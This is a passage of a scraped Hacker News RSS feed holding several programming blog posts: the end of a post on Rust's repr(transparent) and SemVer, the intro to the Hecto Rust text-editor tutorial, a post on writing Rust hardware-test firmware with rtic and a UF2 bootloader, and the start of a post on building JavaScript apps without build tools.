#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Bar(</span><span>u8</span><span>, Foo);
</span></code></pre>
<p>Likewise, adding or modifying a field of a ZST such that the size increases in a breaking change:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(C)]
</span><span>pub struct </span><span>Foo {
    </span><span>bar</span><span>: (),
    </span><span>// uncommenting this field breaks `Bar`:
    /* baz: u8 */
</span><span>}

#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Bar(</span><span>u8</span><span>, Foo);
</span></code></pre><h3 id="type-parameters">Type Parameters</h3>
<p>As type parameters provide a mechanism for consumers to alter the private, internal details of a type, <em>changes</em> to how type parameters are instantiated directly effect the alignment of a type:</p>
<pre><code data-lang="rust"><span>/// `Foo` is *always* a ZST, but its alignment is equal to that of `T` 
</span><span>#[</span><span>repr</span><span>(C)] </span><span>struct </span><span>Foo&lt;T&gt;([T; 0]);

assert_eq!(</span><span>0</span><span>, size_of::&lt;Foo&lt;</span><span>u8</span><span>&gt;&gt;());
assert_eq!(</span><span>0</span><span>, size_of::&lt;Foo&lt;</span><span>u16</span><span>&gt;&gt;());

assert_eq!(</span><span>1</span><span>, align_of::&lt;Foo&lt;</span><span>u8</span><span>&gt;&gt;());
assert_eq!(</span><span>2</span><span>, align_of::&lt;Foo&lt;</span><span>u16</span><span>&gt;&gt;());
</span></code></pre>
<p>...and the size of a type:</p>
<pre><code data-lang="rust"><span>/// `Foo` is 1-aligned, but has the size of `T`
</span><span>#[</span><span>repr</span><span>(C, packed)] </span><span>struct </span><span>Foo&lt;T&gt;(MaybeUninit&lt;T&gt;);

assert_eq!(</span><span>1</span><span>, size_of::&lt;Foo&lt;</span><span>u8</span><span>&gt;&gt;());
assert_eq!(</span><span>2</span><span>, size_of::&lt;Foo&lt;</span><span>u16</span><span>&gt;&gt;());

assert_eq!(</span><span>1</span><span>, align_of::&lt;Foo&lt;</span><span>u8</span><span>&gt;&gt;());
assert_eq!(</span><span>1</span><span>, align_of::&lt;Foo&lt;</span><span>u16</span><span>&gt;&gt;());
</span></code></pre>
<p>Consequently, Rust must usually assume that generically-instantiated fields are <em>not</em> one-aligned ZSTs:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Foo&lt;T, U&gt;(T, [U; 0]);
</span></code></pre><pre><code><span>error<a href="https://doc.rust-lang.org/nightly/error-index.html#E0690" target="_blank">[E0690]</a>: transparent struct needs exactly one non-zero-sized field, but has 2</span>
 <a href="#" data-line="2" data-col="1">--&gt; src/lib.rs:2:1
</a>  |
2 | struct Foo&lt;T, U&gt;(T, [U; 0]);
  | ^^^^^^^^^^^^^^^^^-^^------^^
  | |                |  |
  | |                |  this field is non-zero-sized
  | |                this field is non-zero-sized
  | needs exactly one non-zero-sized field, but has 2
</code></pre>
<p>This error is necessary if one wants to provide <em>definition-site</em> errors for <code>repr(transparent)</code> violations.</p>
<h3 id="const-parameters">Const Parameters</h3>
<p>Unsurprisingly, the instantiation of a const-generic parameter can affect the size of a type:</p>
<pre><code data-lang="rust"><span>/// the alignment of `Foo&lt;N&gt;` is 1
/// the size of `Foo&lt;N&gt;` is `N` bytes
</span><span>#[</span><span>repr</span><span>(C)]
</span><span>struct </span><span>Foo&lt;</span><span>const</span><span> N: </span><span>usize</span><span>&gt;([</span><span>u8</span><span>; N]);
</span></code></pre>
<p>The instantiation of const-generic parameters can also affect the alignment of a type:</p>
<pre><code data-lang="rust"><span>use </span><span>std::mem::align_of;

</span><span>/// alignment of `ZST&lt;{N}&gt;` is equal to `N`
/// the size of `ZST&lt;{N}&gt;` is equal to 0.
</span><span>#[</span><span>repr</span><span>(C)]
</span><span>pub struct </span><span>ZST&lt;</span><span>const</span><span> N: </span><span>usize</span><span>&gt;
where
    (): Align&lt;{N}</span><span>&gt;</span><span>,
{
    align: [</span><span>&lt;</span><span>() </span><span>as </span><span>Align&lt;{N}</span><span>&gt;&gt;</span><span>::Type; </span><span>0</span><span>],
}

assert_eq!(</span><span>1</span><span>, align_of::&lt;ZST&lt;1&gt;&gt;());
assert_eq!(</span><span>2</span><span>, align_of::&lt;ZST&lt;2&gt;&gt;());

</span><span>pub trait </span><span>Align&lt;const N: usize&gt; { </span><span>type </span><span>Type; }
#[</span><span>repr</span><span>(</span><span>align</span><span>(1)</span><span>)] </span><span>pub struct </span><span>Align1;
#[</span><span>repr</span><span>(</span><span>align</span><span>(2)</span><span>)] </span><span>pub struct </span><span>Align2;
</span><span>/* and so on */
</span><span>impl </span><span>Align&lt;{1}&gt; </span><span>for</span><span> () { </span><span>type </span><span>Type </span><span>=</span><span> Align1; }
</span><span>impl </span><span>Align&lt;{2}&gt; </span><span>for</span><span> () { </span><span>type </span><span>Type </span><span>=</span><span> Align2; }
</span><span>/* and so on */
</span></code></pre><h3 id="default-repr-and-rustc-version">Default <code>repr</code> and <code>rustc</code> Version</h3>
<p>Generally speaking, the layout properties of "default repr" (i.e., a type without a <code>repr</code> attribute) are <em>unspecified</em>. To my knowledge, it is not currently specified that:</p>
<pre><code data-lang="rust"><span>enum </span><span>Foo {
  Bar
}
</span></code></pre>
<p>is guaranteed to be a one-aligned and zero-sized. Although <code>Foo</code> may be laid out as such by <em>particular</em> versions of Rust (such as the version available at the time of writing), that may not be true for <em>future</em> versions of Rust. This is a deeper issue than just SemVer stability.</p>
<h2 id="enforcing-semver-stability">Enforcing SemVer Stability</h2>
<p>At the time of writing, there is <a href="https://github.com/rust-lang/rust/issues/78586">some effort to eliminate</a> the stability hazards of <code>repr(transparent)</code>. However, to <em>comprehensively</em> enforce that uses of <code>#[repr(transparent)]</code> are SemVer-respecting at type definition sites in this manner, <code>rustc</code> would need implement all of the following restrictions atop the basic well-formedness check:</p>
<ol>
<li>prohibit, on all but one field, most occurences of type parameters</li>
<li>prohibit, on all but one field, most occurences of const parameters</li>
<li>require, on all but one field, that field types are fully-implicitly constructible</li>
<li>require, on all but one field, that field types have well-specified sizes and alignments</li>
<li>document that changing the <code>repr</code> of <em>any</em> one-aligned ZST is a SemVer Breaking Change™</li>
</ol>
<p>These requirements have far-reaching implications for the role of layout and <code>repr</code> in SemVer stability. Since these adjustments would likely need to be timed with an edition change anyways, it's worth considering if a simpler formulation of <code>repr(transparent)</code> exists. I think there is: limit <code>repr(transparent)</code> to structs on which at most one field is <em>not</em> <code>PhantomData</code>.</p>
<h2 id="beyond-repr-transparent">Beyond <code>repr(transparent)</code></h2>
<p>SemVer aside, <code>repr(transparent)</code>'s restrictions on generic parameters are complex and unwieldy. These restrictions are necessary to ensure, <strong>at definition site</strong>, that <em>any</em> instantiation of the annotated type will be transparent with respect to its non-one-aligned-ZST field. But, in the future, <code>repr(transparent)</code> may not be necessary at all as a layout modifier (merely as a definition-site check).</p>
<p>The Unsafe Code Working Group <a href="https://github.com/rust-lang/unsafe-code-guidelines/pull/164">proposes</a> that one-aligned-ZST fields shalt not influence the layout of default-<code>repr</code> structs, and that default-<code>repr</code> structs with exactly one <em>non</em>-one-aligned-ZST field shall have layout identical to that of the field. If accepted, these rules would mean that one could determine whether or not a particular type was <em>effectively</em> transparent, even in the absence of <code>repr(transparent)</code>. What would be missing is an in-language mechanism to double-check. To this end, I'd suggest the introduction of the compiler-intrinsic trait <code>mem::AbiEq&lt;Other&gt;</code>, which is implemented for all types whose ABI is identical to <code>Other</code>.</p>

  </div></div>]]>
            </description>
            <link>https://jack.wrenn.fyi/blog/semver-snares-transparent/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809318</guid>
            <pubDate>Sun, 17 Jan 2021 09:07:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hecto: Build your own text editor in Rust]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25809288">thread link</a>) | @lukastyrychtr
<br/>
January 17, 2021 | https://www.philippflenker.com/hecto/ | <a href="https://web.archive.org/web/*/https://www.philippflenker.com/hecto/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    <p><a href="https://www.philippflenker.com/hecto-chapter-1/">First chapter</a> - <a href="https://www.philippflenker.com/hecto-appendices/">Appendices</a> - <a href="https://www.philippflenker.com/hecto-chapter-7/">Last chapter</a></p>

<p>This is a series of blog posts that shows you how to
build a text editor in Rust. It’s a re-implementation of
<a href="http://antirez.com/news/108">kilo</a> in Rust, as outlined in <a href="https://viewsourcecode.org/snaptoken/kilo/index.html">this fantastic
tutorial</a>. Same as the
original booklet, these blog posts guide you through all the steps to build a
basic text editor, <code>hecto</code>.</p>

<p>You will almost always be able to see your changes in action by applying the
changes, saving and running the program. I will explain every step along the way
as best as I can - sometimes in great detail, and often linking to other pages.
Feel free to skim over the prose and ignore the links, there is plenty to learn
just by applying the code changes and watching your text editor grow!</p>

<h2 id="why">Why?</h2>
<p>I have always thought that every software engineer needs to have more than
superficial knowledge of at least two programming languages. However, I have to
admit, that in the past few years, my knowledge in pretty much everything except
JavaScript has started to fade.</p>

<p>That’s why I started to learn Rust, and I have re-implemented <code>kilo</code> as a
learning experience. But <em>why</em>? In order to learn Rust, I wanted ro re-implement
a well-understood piece of software, so that I could focus on the language
without getting lost in the implementation details. But I did not want to
re-implement stuff I used JavaScript for, as I think that JavaScript is designed
for a different problem space than Rust. Or in other words: If you are a
plumber, you best learn how to use an axe by using it to chop down some trees,
and not to unclog a sink.</p>

<p><code>kilo</code> is complex enough to pose a challenge, and when I read it, I wished it
was available for Rust - and now it is!</p>

<p>And <em>why</em> the name? <code>hecto</code> follows more modest goals than <code>kilo</code>. It does not
aim to be small, and it wasn’t even my own idea - so it seemed appropriate to
give it a more modest name than its spiritual predecessor.</p>

<h2 id="license">License</h2>
<ul>
  <li><code>kilo</code> was distributed under the <a href="https://opensource.org/licenses/BSD-2-Clause">BSD-2 Clause
License</a></li>
  <li>The <a href="https://viewsourcecode.org/snaptoken/kilo/">original tutorial</a> was
distributed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></li>
  <li><code>hecto</code> and this tutorial are licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY
4.0</a></li>
</ul>

<h3 id="indication-of-changes">Indication of Changes</h3>
<p>While these blog posts are based firmly on the <a href="https://viewsourcecode.org/snaptoken/kilo/index.html">original
tutorial</a>, the code has
been adapted to Rust, not only by calling the closest “rust counterpart
function”, but by trying to solve things “the rust way”. Similarily, all
explanations have been checked and revised, and in many cases heavily rewritten,
in the context of Rust. Therefore, this tutorial should be seen as a “rust
remix” of the original <code>C</code> version.</p>

<h2 id="feedback">Feedback</h2>
<p>I’m happy that you read my work and would love to <a href="https://www.philippflenker.com/about">hear from you</a> - especially if you are either stuck or have found a
better way to solve specific things. Keep in mind that this is mostly an
exercise for me to get to know Rust - so if there’s a better way to do things,
<a href="https://www.philippflenker.com/about">please reach out</a>!</p>

<h2 id="table-of-contents">Table of Contents</h2>
<ol>
  <li><a href="https://www.philippflenker.com/hecto-chapter-1/">Setup</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-2/">Reading User Input</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-3/">Raw User Input and Output</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-4/">A Text Viewer</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-5/">A Text Editor</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-6/">Search</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-7/">Syntax Highlighting</a></li>
</ol>

<ul>
  <li><a href="https://www.philippflenker.com/hecto-appendices/">Appendices</a></li>
</ul>

  </div></div>]]>
            </description>
            <link>https://www.philippflenker.com/hecto/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809288</guid>
            <pubDate>Sun, 17 Jan 2021 09:00:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Testing Hardware Using Rust]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809208">thread link</a>) | @lukastyrychtr
<br/>
January 17, 2021 | https://www.jaredwolff.com/testing-hardware-using-rust/ | <a href="https://web.archive.org/web/*/https://www.jaredwolff.com/testing-hardware-using-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img alt="nRF9160 Feather Test CLI" src="https://www.jaredwolff.com/testing-hardware-using-rust/images/Screen_Shot_2021-01-06_at_10.30.55_AM.png" data-src="images/Screen_Shot_2021-01-06_at_10.30.55_AM.png"></p><p>Rust has grown on me over the past year. I consumed <a href="https://doc.rust-lang.org/stable/book/" target="_blank">The Book</a> while on a plane ride in February of last year <em>right</em> before Covid hit. It has basically been all downhill since. 😅</p><p>Since then, i’ve designed a (very alpha) <a href="https://github.com/jaredwolff/eagle-plm" target="_blank">CLI based MRP system</a>, e-commerce backend for <a href="https://www.jaredwolff.com/store/" target="_blank">my static website</a>, CLI based tester and firmware for my nRF9160 Feather test fixture. Yea, all in Rust.</p><p>In this article, i’ll be sharing details about how I developed the CLI and ATSAMD based tester for the <a href="https://www.jaredwolff.com/store/nrf9160-feather/" target="_blank">nRF9160 Feather</a>. By the end this should give you confidence that you can also develop your own firmware and software 100% in Rust!</p><p>Let’s get started.</p><h2 id="sprinkle-some-rust-in-your-firmware">Sprinkle some Rust in your firmware</h2><p><img alt="nRF9160 Feather tester hardware render" src="https://www.jaredwolff.com/testing-hardware-using-rust/images/feather-tester_v14.png" data-src="images/feather-tester_v14.png"></p><p>As mentioned earlier, I designed my tester hardware (pictured above) to use an ATSAMD microcontroller. I had a few reasons why I chose the ATSAMD21:</p><ol><li>It has a <strong>ton</strong> of pins. (ATSAMD21J18A-MFT has 52 to be exact!) This was going to be important in order to connect to and control everything about the DUT (Device under test) in the tester.</li><li>SAMD21 series is also ubiquitous and plentiful elsewhere. It also happens to have great support in the form of the <code>atsamd-hal</code> crate. (<a href="https://github.com/atsamd-rs/atsamd" target="_blank">Link</a>)</li></ol><p>While there is some test firmware on the DUT itself, there’s a bunch of exciting stuff happening on the tester side. But before we do, let’s chat about the bootloader.</p><h3 id="first-thing-you-should-do">First thing you should do</h3><p>After lots of tinkering I realized that one of the first things you should do on any SAMD based project is get the UF2 bootloader loaded. Since loading it onto my test board <strong>I haven’t used my debug probe.</strong> (Rust makes this extremely easy since it eliminates 80% of the stupid mistakes i’d otherwise make in C)</p><p>Here’s a quick primer on how I got my board working:</p><ol><li><p>I cloned the UF2 repo:</p><div><pre><code data-lang="bash">git clone https://github.com/microsoft/uf2-samdx1
</code></pre></div></li><li><p>Created a folder called <code>circuitdojo_feather_tester</code> within the <code>boards</code> directory.</p><div><pre><code data-lang="bash">cd uf2-samdx1
mkdir boards/circuitdojo_feather_tester
</code></pre></div></li><li><p>I created <code>board.mk</code> and <code>board_config.h</code></p><div><pre><code data-lang="bash">cd boards/circuitdojo_feather_tester
touch board.mk
touch board_config.h
</code></pre></div></li><li><p>Using the already existing boards in the <code>boards</code> folder, updated the contents of <code>http://board.mk</code> and <code>board_config.h</code>. First <code>board.mk</code> to define what chip I was targeting:</p><div><pre><code data-lang="c">CHIP_FAMILY <span>=</span> samd21
CHIP_VARIANT <span>=</span> SAMD21J18A
</code></pre></div><p>Then <code>board_config.h</code> for all the configuration bits:</p><div><pre><code data-lang="c"><span>#ifndef BOARD_CONFIG_H
</span><span>#define BOARD_CONFIG_H
</span><span></span>
<span>#define VENDOR_NAME "Circuit Dojo"
</span><span>#define PRODUCT_NAME "Feather Tester"
</span><span>#define VOLUME_LABEL "BOOT"
</span><span>#define INDEX_URL "https:</span><span>//www.jaredwolff.com/"
</span><span></span><span>#define BOARD_ID "SAMD21G18A-Feather-v0"
</span><span></span>
<span>#define USB_VID 0x16c0
</span><span>#define USB_PID 0x27dd
</span><span></span>
<span>#define LED_PIN PIN_PA22
</span><span></span>
<span>#endi
</span></code></pre></div></li><li><p>Then using the instructions in the Readme, build the code:</p><div><pre><code data-lang="bash">make BOARD<span>=</span>circuitdojo_feather_tester
</code></pre></div><p>I used the toolchain that comes with NCS v1.4.1. I did have to make a change to the Makefile for everything to compile without borking. Turns out my toolchain was newer than expected. Fortunately adding <code>Wno-deprecated</code> inside the Makefile to the <code>WFLAGS</code> variable fixes this problem.</p></li><li><p>Once complete it will dump your binary/hex files to <code>build/&lt;your board name&gt;</code></p></li><li><p>Then I flashed the bootloader using <code>pyocd</code> like so:</p><div><pre><code data-lang="bash">pyocd flash -t ATSAMD21J18A -f <span>4000000</span> bootloader-circuitdojo_feather_tester-v3.4.0-65-gdf89a1f-dirty.elf --format elf
</code></pre></div><p><code>pyocd</code> is just one of many ways to load firmware. The <a href="https://github.com/atsamd-rs/atsamd" target="_blank"><code>atsamd-rs</code> repo</a> has a ton more options.</p></li></ol><p>Once programmed, hit the reset button twice in quick succession to enable bootloader mode. (I believe this is consistent across all other boards using the UF2 bootloader. Correct me if i’m wrong!) This will cause the bootloader to remain active so you can transfer new firmware.</p><p>On a scale from easy to painful, this was defintiely on the easy side of the spectrum. The folks at Microsoft and contributors like Adafruit made this process <em>really simple.</em></p><h3 id="hey-my-name-is-hal">Hey, my name is HAL</h3><p><img alt="Compiling Rust firmware" src="https://www.jaredwolff.com/testing-hardware-using-rust/images/Screen_Shot_2021-01-10_at_12.37.34_PM.png" data-src="images/Screen_Shot_2021-01-10_at_12.37.34_PM.png"></p><p>As of this writing, every different hardware platform has some type of independently created HAL (hardware abstraction layer). Atmel’s SAMD differs slightly from nRF and that differs from the STM32s of the world. The nice thing is as long as they conform to the higher level APIs, you can use something like the <a href="https://github.com/mvirkkunen/usb-device" target="_blank">USB crate</a> which supports ATSAMD and STM32.</p><p>The fastest way to get started with your own ATSAMD based board to create your own board definition. You can find a <strong>ton</strong> of example in the <code>boards</code> directory. Many off the shelf boards are already supported which makes for one less thing you need to do!</p><p>If you do find yourself with a custom board, you can copy one of the already existing boards that is closest to yours. For instance I used <code>feather_m0</code> as the base for my tester board. I tweaked <code>memory.x</code> and <code>src/lib.rs</code> to my liking.</p><p>There’s even a cool way to define pins so you can easily access them later. For for instance if you have a pin named <code>FLASH_EN</code> and it’s mapped to pin port B, pin 8 you can simply reference it later on using the <code>Pins</code> struct like <code>pins.flash_en</code>. (More below..)</p><p>The ATSAMD repo is going through some slow and steady improvements. There are even some nice additions to the <a href="https://github.com/atsamd-rs/atsamd/pull/371" target="_blank">board support</a> area that i’m excited about and testing. While it’s mostly useable, it is rough in some areas (especially related to documentation).</p><p><em>Big shoutout to Bradley who has been spearheading these improvements. If I were to do any of this, i’d be surprised it would be working by then of it.</em> 😅</p><h3 id="dont-be-unsafe">Don’t be <code>unsafe</code></h3><p>When I first started developing the test firmware, I notice that I was using <code>unsafe</code> a lot. While in hardwareland using <code>unsafe</code> is not uncommon, from a readability and risk for increased errors perspective, it can get hairy.</p><p>There is a cool solution around this and that’s where <code>rtic</code> enters the picture. <code>rtic</code> is a new spin on how to write firmware in Rust. Instead of having the familiar <code>main</code> function, it works differently. Here’s the features from <a href="https://github.com/rtic-rs/cortex-m-rtic" target="_blank">the Github page</a>:</p><ul><li><strong>Tasks</strong>&nbsp;as the unit of concurrency [^1]. Tasks can be&nbsp;<em>event triggered</em>&nbsp;(fired in response to asynchronous stimuli) or spawned by the application on demand.</li><li><strong>Message passing</strong>&nbsp;between tasks. Specifically, messages can be passed to software tasks at spawn time.</li><li><strong>A timer queue</strong>&nbsp;[^2]. Software tasks can be scheduled to run at some time in the future. This feature can be used to implement periodic tasks.</li><li>Support for prioritization of tasks and, thus,&nbsp;<strong>preemptive multitasking</strong>.</li><li><strong>Efficient and data race free memory sharing</strong>&nbsp;through fine grained&nbsp;<em>priority based</em>&nbsp;critical sections [^1].</li><li><strong>Deadlock free execution</strong>&nbsp;guaranteed at compile time. This is an stronger guarantee than what’s provided by&nbsp;<a href="https://doc.rust-lang.org/std/sync/struct.Mutex.html" target="_blank">the standard&nbsp;<code>Mutex</code>abstraction</a>.</li><li><strong>Minimal scheduling overhead</strong>. The task scheduler has minimal software footprint; the hardware does the bulk of the scheduling.</li><li><strong>Highly efficient memory usage</strong>: All the tasks share a single call stack and there’s no hard dependency on a dynamic memory allocator.</li><li><strong>All Cortex-M devices are fully supported</strong>.</li><li>This task model is amenable to known WCET (Worst Case Execution Time) analysis and scheduling analysis techniques. (Though we haven’t yet developed Rust friendly tooling for that.)</li></ul><p>While all these features and capabilities seem great, so what gives?</p><p>Well, for starters there’s no <code>main</code> function. 🙀</p><p>Here’s what a basic blinky app looks like using some of the new BSP (Board support packages) I mentioned earlier:</p><div><pre><code data-lang="rust"><span>#![deny(unsafe_code)]</span>
<span>#![no_main]</span>
<span>#![no_std]</span>

<span>extern</span> <span>crate</span> circuitdojo_tester <span>as</span> hal;
<span>use</span> panic_halt <span>as</span> _;

<span>use</span> hal::clock::GenericClockController;

<span>use</span> hal::delay::Delay;
<span>use</span> hal::prelude::<span>*</span>;
<span>use</span> hal::Pins;

<span>#[rtic::app(device = hal::pac, peripherals = true)]</span>
<span>const</span> APP: () <span>=</span> {
    <span>struct</span> <span>Resources</span> {
        led_pass: <span>hal</span>::LedPass,
        delay: <span>Delay</span>,
    }
    <span>#[init()]</span>
    <span>fn</span> <span>init</span>(cx: <span>init</span>::Context) -&gt; <span>init</span>::LateResources {
        <span>let</span> <span>mut</span> peripherals <span>=</span> cx.device;
        <span>let</span> <span>mut</span> clocks <span>=</span> GenericClockController::with_external_32kosc(
            peripherals.GCLK,
            <span>&amp;</span><span>mut</span> peripherals.PM,
            <span>&amp;</span><span>mut</span> peripherals.SYSCTRL,
            <span>&amp;</span><span>mut</span> peripherals.NVMCTRL,
        );
        <span>let</span> pins <span>=</span> Pins::new(peripherals.PORT);
        <span>let</span> led_pass <span>=</span> pins.led_pass.into_push_pull_output();

        <span>let</span> delay <span>=</span> Delay::new(cx.core.SYST, <span>&amp;</span><span>mut</span> clocks);

        init::LateResources { led_pass, delay }
    }
    <span>#[idle(resources=[led_pass, delay]</span>)]
    <span>fn</span> <span>idle</span>(cx: <span>idle</span>::Context) -&gt; <span>!</span> {
        <span>loop</span> {
            <span>let</span> _ <span>=</span> cx.resources.led_pass.toggle();
            cx.resources.delay.delay_ms(<span>500</span><span>u32</span>);
        }
    }
};
</code></pre></div><p>The <code>init</code> function is where you would normally put anything you’d normally put in an Arduino <code>setup</code> function. We’re setting up pins and peripherals. If you want to use them later on though, you’ll need to create an entry in <code>Resources</code>. This is also where you store any type of static mutable data structures that you need elsewhere in your firmware.</p><p>The <code>idle</code> function is similar to the <code>loop</code> function in Arduino. It’s important though that if you want a loop, you have to implement it. Here’s the warning in the <a href="https://rtic.rs/0.5/book/en/by-example/app.html?highlight=loop#idle" target="_blank"><code>rtic</code> documentation</a>:</p><blockquote><p>Unlike init, idle will run with interrupts enabled and it’s not allowed to return so it must run forever.</p></blockquote><p>You don’t <strong>need</strong> to use an <code>idle</code> function though. If you don’t, your microcontroller will go to sleep. This is ideal for battery powered applications that need to sleep as much as possible.</p><p>In <code>rtic</code> every work function gets a <code>Context</code> variable. It allow you to access resources that are pertinent to that function’s purpose. Access is only granted though when you add a resource like below:</p><div><pre><code data-lang="rust"><span>#[idle(resources=[led_pass, delay]</span>)]
</code></pre></div><p>If <code>resources</code> was not set like above, I would not be able to use <code>led_pass</code> or <code>delay</code> within the function!</p><p>While this is a simple example, when you start using static resources like fixed size vectors you’ll be happy you chose to use <code>rtic</code>. The <a href="https://github.com/japaric/heapless" target="_blank"><code>heapless</code></a> crate has been extremely useful for setting size contrained elements that you’d normally be able to use with Rust’s <code>std</code> lib.</p><p>While <code>heapless</code> implements a few very handy types, the <code>Vec</code> and <code>spsc</code> imlementation have been <em>extremely</em> useful. If you’re looking for <code>std</code> conventions for embedded, no need to look further. Get started with <code>heapless</code> with their great documentation <a href="https://japaric.github.io/heapless/heapless/index.html" target="_blank">here</a>.</p><h3 id="the-confusion-ensues">The confusion ensues</h3><p>One thing that may be confusing …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jaredwolff.com/testing-hardware-using-rust/">https://www.jaredwolff.com/testing-hardware-using-rust/</a></em></p>]]>
            </description>
            <link>https://www.jaredwolff.com/testing-hardware-using-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809208</guid>
            <pubDate>Sun, 17 Jan 2021 08:43:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I build JavaScript apps in 2021]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809132">thread link</a>) | @timdaub
<br/>
January 17, 2021 | https://timdaub.github.io/2021/01/16/web-principles/ | <a href="https://web.archive.org/web/*/https://timdaub.github.io/2021/01/16/web-principles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>It's now roughly seven or eight years that I'm building dynamic front ends for the web. From <a target="_blank" rel="noopener" href="https://www.ascribe.io/">digital art wallets</a> to games (<a target="_blank" rel="noopener" href="https://ipfs.leapdao.org/blog/Planet-A-ccc-ethberlin-recap/">1</a>, <a href="https://timdaub.github.io/videogame">2</a>) and <a href="https://timdaub.github.io/wasm-synth">synthesizers</a>, I've seen it all. And since my process of creation has dramatically changed over the years, today, I'd like to share how I'm developing web apps in 2021.</p>
<h2 id="i-avoid-build-processes.">I avoid build processes.</h2>
<p>I still remember the debates with colleagues about using <a target="_blank" rel="noopener" href="https://babeljs.io/">babel</a> a few years ago. Within the front end development world, transpiling had just become a thing, so we ended up babelifying our builds to use ES6. Our argument back then was that one day, we would be able to push our application's directory structure on a web server and since all browsers would then support the augmented ES6 features, our app would just work! Without a build process. WOW! That must have been around 2015. When I look at the source code of these old applications now, our technical visions didn't end up becoming reality.</p>
<p>Now, I try to keep my build process to a minimum. When I need to write a demo app, I particularly like using <a target="_blank" rel="noopener" href="https://babeljs.io/docs/en/babel-standalone#script-tags"><code>&lt;script type="text/babel"&gt;</code></a>. I love <a target="_blank" rel="noopener" href="https://preactjs.com/guide/v10/getting-started/#no-build-tools-route">preact's "no build tools route."</a> too. When I have to set up an actual app, I avoid <a target="_blank" rel="noopener" href="https://webpack.js.org/">webpack</a> and <a target="_blank" rel="noopener" href="https://rollupjs.org/">rollup</a>. I mainly get frustrated about the myriad ways of configuring them. Some minor thing always ends up being broken, which leads to hours of debugging foreign code. And that's frustrating. Using preact's no build route, finally something like the above is possible:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span>&lt;script type=<span>"module"</span>&gt;</span><br><span>  </span><br><span>  <span>import</span> { h, Component, render } <span>from</span> <span>'https://unpkg.com/preact?module'</span>;</span><br><span>  <span>const</span> app = h(<span>'h1'</span>, <span>null</span>, <span>'Hello World!'</span>);</span><br><span>  render(app, <span>document</span>.body);</span><br><span>&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>When having to use a build tool, I gravitate towards <a target="_blank" rel="noopener" href="https://parceljs.org/">parcel</a> or <a target="_blank" rel="noopener" href="https://github.com/developit/microbundle">microbundle</a> as they come preconfigured. And in particular, parcel is excellent, as it's merely using an HTML file as its entry point. To me, that's promising as it assumes a proper directory structure and properly connected files such that maybe one day I can push my app to the web without that build step.</p>
<h2 id="i-avoid-transpiling.">I avoid transpiling.</h2>
<p>For the same reasons as pointed out above, I also try to avoid transpiling. It's not because I don't like ESNext features, but more because I want to minimize the risk of getting stuck with the transpiler. Hence, I try to avoid using babel. <a href="https://timdaub.github.io/2020/09/01/typescript/">I also don't use Typescript</a>. To me, JavaScript is productive enough. Additionally, for <a target="_blank" rel="noopener" href="https://reactjs.org/">react</a>-style projects, no transpilers mean I stopped using <a target="_blank" rel="noopener" href="https://reactjs.org/docs/introducing-jsx.html">JSX</a>. Instead, I found an excellent library called <a target="_blank" rel="noopener" href="https://github.com/developit/htm">htm</a> that uses JavaScript's template strings. It has a similar syntax to JSX, but it's not breaking ECMAScript standards and hence needs no transpliation.</p>
<h2 id="i-avoid-the-new-and-shiny.">I avoid the <em>new</em> and <em>shiny</em>.</h2>
<p>I even avoid changing the way I work if I don't feel comfortable or inclined. For example, I never switched to <a target="_blank" rel="noopener" href="https://reactjs.org/docs/hooks-intro.html">react hooks</a>. The <a target="_blank" rel="noopener" href="https://reactjs.org/docs/state-and-lifecycle.html">lifecycle methods</a> that I initially know from iOS Objective-C programming are - in my opinion - a beautiful metaphor for writing front end components. And neither did I have any issues with my sites' performance. I would make the switch if I started to have problems. But I don't. The same goes for up and coming frameworks. Angular V2? <a target="_blank" rel="noopener" href="https://svelte.dev/">Svelte</a>? Cool, but why relearn a framework when I'm already productive with the one I use?</p>
<h2 id="i-test-everything.">I test EvErYtHiNg.</h2>
<p>When I started front-end development, testing was complicated. Only a few front end developer colleagues tested their apps properly. I ended up doing a lot of testing by hand. It was frustrating and unproductive. But testing front ends has improved dramatically over the years. Not only have the tools been significantly enhanced.</p>
<p>We, as front-end developers, have now also figured out how to correctly write front end tests. Finally, we're able to distinguish between functional code and presentational code. For functional code, we now write unit tests. For presentational code, we use snapshot-based testing and integration tests. I'm pleased about tools like <a target="_blank" rel="noopener" href="https://www.cypress.io/">cypress</a> that is great for integration tests. I also like <a target="_blank" rel="noopener" href="https://github.com/avajs/ava/">ava</a> for unit tests.</p>
<h2 id="i-optimize-for-performance-and-quality.">I optimize for performance and quality.</h2>
